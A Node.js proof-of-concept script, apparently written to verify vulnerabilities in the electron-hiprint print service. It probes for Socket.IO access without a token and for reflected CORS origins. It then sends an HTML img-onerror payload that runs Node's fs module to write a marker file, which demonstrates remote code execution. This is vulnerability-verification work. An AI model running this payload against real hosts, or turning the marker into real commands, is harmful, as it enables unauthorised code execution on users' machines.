"use strict";

const fs = require("fs");
const http = require("http");
const os = require("os");
const path = require("path");
const { io } = require("socket.io-client");

function getArg(name, fallback) {
  const index = process.argv.indexOf(name);
  if (index === -1 || index + 1 >= process.argv.length) return fallback;
  return process.argv[index + 1];
}

function hasFlag(name) {
  return process.argv.includes(name);
}

const host = getArg("--host", "127.0.0.1");
const port = Number(getArg("--port", "17521"));
const timeoutMs = Number(getArg("--timeout-ms", "5000"));
const authToken = getArg("--token", "");
const origin = getArg("--origin", "http://codex-repro.invalid");
const sendMarkerPayload = hasFlag("--send-marker-payload");
const markerPath = path.resolve(
  getArg(
    "--marker-path",
    path.join(os.tmpdir(), `electron-hiprint-rce-marker-${process.pid}.txt`),
  ),
);

function socketUrl() {
  return `http://${host}:${port}`;
}

function connectProbe(token) {
  return new Promise((resolve) => {
    const socket = io(socketUrl(), {
      transports: ["websocket"],
      timeout: timeoutMs,
      reconnection: false,
      auth: token ? { token } : {},
    });
    const timer = setTimeout(() => {
      socket.close();
      resolve({ connected: false, error: "timeout" });
    }, timeoutMs);
    socket.on("connect", () => {
      clearTimeout(timer);
      const id = socket.id;
      socket.close();
      resolve({ connected: true, socketId: id });
    });
    socket.on("connect_error", (error) => {
      clearTimeout(timer);
      socket.close();
      resolve({
        connected: false,
        error: error.message,
        data: error.data,
      });
    });
  });
}

function corsProbe() {
  return new Promise((resolve) => {
    const req = http.request(
      {
        host,
        port,
        method: "GET",
        path: `/socket.io/?EIO=3&transport=polling&t=${Date.now()}`,
        headers: {
          Origin: origin,
        },
        timeout: timeoutMs,
      },
      (res) => {
        res.resume();
        res.on("end", () => {
          resolve({
            ok: true,
            statusCode: res.statusCode,
            reflectedOrigin:
              res.headers["access-control-allow-origin"] === origin,
            allowOrigin: res.headers["access-control-allow-origin"] || "",
          });
        });
      },
    );
    req.on("timeout", () => {
      req.destroy(new Error("timeout"));
    });
    req.on("error", (error) => {
      resolve({ ok: false, error: error.message });
    });
    req.end();
  });
}

function waitForMarker() {
  const startedAt = Date.now();
  return new Promise((resolve) => {
    const timer = setInterval(() => {
      if (fs.existsSync(markerPath)) {
        clearInterval(timer);
        resolve(true);
        return;
      }
      if (Date.now() - startedAt > timeoutMs) {
        clearInterval(timer);
        resolve(false);
      }
    }, 100);
  });
}

function sendRendererMarkerPayload() {
  return new Promise((resolve) => {
    const socket = io(socketUrl(), {
      transports: ["websocket"],
      timeout: timeoutMs,
      reconnection: false,
      auth: authToken ? { token: authToken } : {},
    });
    const timer = setTimeout(() => {
      socket.close();
      resolve({ sent: false, error: "timeout" });
    }, timeoutMs);
    socket.on("connect", async () => {
      clearTimeout(timer);
      try {
        if (fs.existsSync(markerPath)) fs.unlinkSync(markerPath);
      } catch {
        // The marker is best-effort evidence; stale cleanup failure is reported by absence below.
      }
      const markerScript = `try{require("fs").writeFileSync(${JSON.stringify(
        markerPath,
      )},"renderer nodeIntegration marker\\n")}catch(e){}`;
      const html = `<img src=x onerror='${markerScript}'>`;
      socket.emit("news", {
        title: "codex-runtime-marker",
        templateId: `codex-runtime-marker-${Date.now()}`,
        type: "url_pdf",
        pdf_path: path.join(os.tmpdir(), "electron-hiprint-missing-repro.pdf"),
        html,
      });
      const markerWritten = await waitForMarker();
      socket.close();
      resolve({ sent: true, markerWritten, markerPath });
    });
    socket.on("connect_error", (error) => {
      clearTimeout(timer);
      socket.close();
      resolve({ sent: false, error: error.message, data: error.data });
    });
  });
}

(async () => {
  const unauth = await connectProbe("");
  const cors = await corsProbe();
  const marker = sendMarkerPayload
    ? await sendRendererMarkerPayload()
    : { skipped: true };

  const risks = [];
  if (unauth.connected) {
    risks.push({
      id: "SEC-AUTH-DEFAULT-EMPTY",
      detail: "Socket.IO connection succeeded without auth token.",
    });
  }
  if (cors.reflectedOrigin) {
    risks.push({
      id: "SEC-CORS-REFLECTS-ORIGIN",
      detail: `CORS reflected ${origin}.`,
    });
  }
  if (marker.markerWritten) {
    risks.push({
      id: "SEC-REMOTE-HTML-NODE-EXECUTION",
      detail: `Renderer HTML payload wrote marker file ${marker.markerPath}.`,
    });
  }

  const appUnavailable =
    !unauth.connected &&
    !cors.ok &&
    /ECONNREFUSED|ENOTFOUND|EHOSTUNREACH|timeout/i.test(
      `${unauth.error || ""} ${cors.error || ""}`,
    );

  console.log(
    JSON.stringify(
      {
        target: socketUrl(),
        unauth,
        cors,
        marker,
        risks,
      },
      null,
      2,
    ),
  );

  if (appUnavailable) {
    process.exitCode = 2;
    return;
  }
  if (risks.length > 0) {
    process.exitCode = 1;
  }
})();
